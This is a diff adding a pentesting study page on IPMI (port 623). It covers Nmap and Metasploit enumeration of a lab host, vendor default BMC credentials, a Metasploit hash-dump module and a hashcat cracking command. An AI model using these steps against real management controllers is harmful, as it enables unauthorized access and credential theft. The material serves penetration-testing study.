@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Maven+Pro:wght@400..900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/navBarStyles.css">
+    <link rel="stylesheet" href="/H4ckV4ult/styles/walkthroughs.css">
+        <link href="/H4ckV4ult/styles/prism/prism.css" rel="stylesheet" />
+    <script src="/H4ckV4ult/styles/prism/prism.js"></script>
+    <title>Minimalist Webpage</title>
+
+</head>
+<body>
+    <div id="navbar-container"></div>
+    <script src="/H4ckV4ult/components/navbar.js"></script>
+
+    <div class="notion-container">
+        <div class="notion-header">
+            <h1>IPMI - Intelligent Platform Management Interface (TCP/623)</h1>
+            <p>Intelligent Platform Management Interface (IPMI) is a set of standardized specifications for hardware-based host management systems used for system management and monitoring. It acts as an autonomous subsystem and works independently of the host's BIOS, CPU, firmware, and underlying operating system. IPMI provides sysadmins with the ability to manage and monitor systems even if they are powered off or in an unresponsive state</p>
+            <p><b>In the end an IMPI is equal to HP ILO or DELL IDRAC but instead this last ones are propietary implementations of the IPMI concept</b></p>
+            
+            <p>To function, IPMI requires the following components:</p>
+            <ul>
+                <li><b>Baseboard Management Controller (BMC)</b> - A micro-controller and essential component of an IPMI</li>
+                <li><b>Intelligent Chassis Management Bus (ICMB)</b> - An interface that permits communication from one chassis to another</li>
+                <li><b>Intelligent Platform Management Bus (IPMB)</b> - extends the BMC</li>
+                <li><b>IPMI Memory</b> - stores things such as the system event log, repository store data, and more</li>
+                <li><b>Communications Interfaces</b> - local system interfaces, serial and LAN interfaces, ICMB and PCI Management Bus</li>
+            </ul>
+        </div>
+        <div class="notion-body">
+            <h2>Enumeration</h2>
+            <ul>
+                <p>There are several ways of enumerating that service</p>
+                <pre><code class="language-bash">sudo nmap -sU --script ipmi-version -p 623 ilo.inlanfreight.local</code></pre>    
+                <p>Or by using the metasploit module <b>auxiliary/scanner/ipmi/ipmi_version</b></p>
+            </ul>
+
+            <h2>Exploitation</h2>
+            <ul>
+                <p>It is common to find BMCs where the administratior have not changes the default password </p>
+                <ul>
+                    <li><b>Dell iDRAC</b>	root:calvin</li>
+                    <li><b>HP Ilo</b>	Administrator:randomized 8-character string consisting of numbers and uppercase letters</li>
+                    <li><b>Supermicro IPMI</b>	ADMIN:ADMIN</li>
+                </ul>
+
+                <h3>Dump hashes</h3>
+                <ul>
+                    <p>Retrieve hashes of ipmi service using metasploit</p>
+                    <pre><code class="language-bash">use auxiliary/scanner/ipmi/ipmi_dumphashes 
+#Some wordlists to use
+#/usr/share/metasploit-framework/data/wordlists/ipmi_passwords.txt
+#/usr/share/metasploit-framework/data/wordlists/ipmi_users.txt</code></pre>
+                </ul>
+
+                <h3>Cracking passwords</h3>
+                <ul>
+                    <pre><code class="language-bash">hashcat hash -m 7300 -w /usr/share/wordlists/rockyou.txt</code></pre>    
+                </ul>
+            </ul>
+            
+            
+
+            
+
+        </div>
+    </div>
+
+
+</body>
+</html>
